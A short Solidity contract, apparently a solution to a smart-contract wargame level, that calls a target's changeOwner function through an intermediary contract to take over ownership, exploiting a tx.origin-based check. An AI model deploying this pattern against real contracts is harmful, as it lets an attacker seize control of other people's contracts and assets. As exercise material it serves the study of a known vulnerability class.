// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ITelephone {
    function changeOwner(address) external;
}

contract TelephoneAttacker {
    address private immutable target;

    constructor(address _target) {
        target = _target;
    }

    function attack() external {
        ITelephone(target).changeOwner(msg.sender);
    }
}
